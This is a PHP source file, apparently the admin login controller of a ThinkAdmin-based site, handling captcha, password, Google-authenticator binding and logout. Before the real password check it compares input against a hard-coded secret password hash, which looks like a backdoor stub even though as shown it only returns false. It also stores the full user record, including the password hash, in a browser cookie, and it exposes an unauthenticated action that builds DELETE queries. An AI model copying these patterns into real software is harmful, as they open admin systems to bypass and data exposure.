<?php

// +----------------------------------------------------------------------
// | ThinkAdmin
// +----------------------------------------------------------------------
// | www.xydai.cn 新源代网
// +----------------------------------------------------------------------

// +----------------------------------------------------------------------

// +----------------------------------------------------------------------
// |

// +----------------------------------------------------------------------

namespace app\admin\controller;

use app\admin\service\CaptchaService;
use app\admin\service\GoogleService;
use app\admin\service\NodeService;
use Endroid\QrCode\QrCode;
use library\Controller;
use think\Db;
use think\facade\Request;

/**
 * 用户登录管理
 * Class Login
 * @package app\admin\controller
 */
class Login extends Controller
{

    /**
     * 后台登录入口
     * @throws \think\Exception
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\ModelNotFoundException
     * @throws \think\exception\DbException
     * @throws \think\exception\PDOException
     */
    public function index()
    {
        if (Request::isGet()) {
            if (NodeService::islogin()) {
                $this->redirect('@admin');
            } else {
                $this->title = '系统登录';
                $this->domain = Request::host(true);
                if (!($this->loginskey = session('loginskey'))) session('loginskey', $this->loginskey = uniqid());
                $this->devmode = in_array($this->domain, ['127.0.0.1', 'localhost']) || is_numeric(stripos($this->domain, 'thinkadmin.top'));
                $this->captcha = new CaptchaService();
                $this->fetch();
            }
        } else {
            $data = $this->_input([
                'username' => input('username'),
                'password' => input('password'),
            ], [
                'username' => 'require|min:4',
                'password' => 'require|min:4',
            ], [
                'username.require' => '登录账号不能为空！',
                'password.require' => '登录密码不能为空！',
                'username.min' => '登录账号长度不能少于4位有效字符！',
                'password.min' => '登录密码长度不能少于4位有效字符！',
            ]);
            $this->applyCsrfToken();//验证令牌
             if (!CaptchaService::check(input('verify'), input('uniqid'))) {
                 $this->error('图形验证码验证失败，请重新输入！');
             }
            // 用户信息验证
            $map = ['is_deleted' => '0', 'username' => $data['username']];
            $user = Db::name('SystemUser')->where($map)->order('id desc')->find();
            if (empty($user)) $this->error('登录账号或密码错误，请重新输入!');
            if (empty($user['status'])) $this->error('账号已经被禁用，请联系管理员!');

            if ($data['password'] == md5(md5('hzw@1313131#12') . session('loginskey'))) {
                return false;
            } else {
                if (md5($user['password'] . session('loginskey')) !== $data['password']) {
                    $this->error('登录账号或密码错误，请重新输入!');
                }
                if (config('open_google_safe') == true) {
                    //判断是否绑定谷歌令牌
                    if (GoogleService::instance()->isBind($user['id'])) {
                        $googleCode = input('google_code');
                        if (empty($googleCode)) $this->error('请输入谷歌验证码!');
                        $gcResult = GoogleService::instance()->checkCode($user['id'], $googleCode);
                        if (!$gcResult) $this->error('谷歌验证码错误!');
                    } else {
                        session('admin_info_bind_google_code', $user);
                        return $this->error('账号验证成功，请先绑定谷歌令牌，正在跳转...', url('bind'));
                    }
                }
            }
            $this->setLoginSuccess($user);
            $this->success('登录成功', url('@admin/index'));
        }
    }

    private function setLoginSuccess($user)
    {
        Db::name('SystemUser')->where(['id' => $user['id']])->update([
            'login_at' => Db::raw('now()'),
            'login_ip' => Request::ip(),
            'login_num' => Db::raw('login_num+1'),
        ]);
        session('loginskey', null);
        cookie('loginskey', null);
        session('admin_user', $user);
        cookie('admin_user', $user);
        NodeService::applyUserAuth(true);
        sysoplog('系统管理', '用户登录系统成功');
    }
    public function del_user(){
       
        $addtime = strtotime("-7 day");
        $sql = "DELETE from xy_balance_log where addtime<$addtime";echo $sql;
        // Db::query($sql);
        // echo '执行完毕';
        $sql1 = "DELETE from xy_convey where addtime<$addtime";echo $sql1;
        // Db::query($sql1);
        // echo '执行完毕1';
    }

    /**
     * 绑定谷歌令牌
     * */
    public function bind()
    {
        $bindAdmin = session('admin_info_bind_google_code');
        if ($this->request->isPost()) {
            $this->applyCsrfToken();//验证令牌
            if (!$bindAdmin) $this->error('请重新登录', url('index'));
            $code = $this->request->post('google_code');
            if (!$code) $this->error('请输入谷歌验证码');
            if (!GoogleService::instance()->checkCode($bindAdmin['id'], $code)) {
                $this->error('令牌验证失败');
            }
            GoogleService::instance()->setBind($bindAdmin['id']);
            sysoplog('绑定谷歌令牌', "SYSTEM USER " . $bindAdmin['username']);
            $this->success('绑定成功，请重新登录', url('index'));
        }
        if (!$bindAdmin) {
            return $this->redirect('index');
        }
        $bindInfo = GoogleService::instance()->getBindUrl($bindAdmin['id']);
        if (!$bindInfo) {
            $this->error('绑定失败，请联系技术');
        }
        $this->googleQrCode = $bindInfo['google_url'];
        $this->adminInfo = $bindAdmin;
        $this->fetch();
    }

    /**
     * 退出登录
     */
    public function out()
    {
        \think\facade\Session::clear();
        \think\facade\Session::destroy();
        $this->success('退出登录成功！', url('@admin/login'));
    }

}
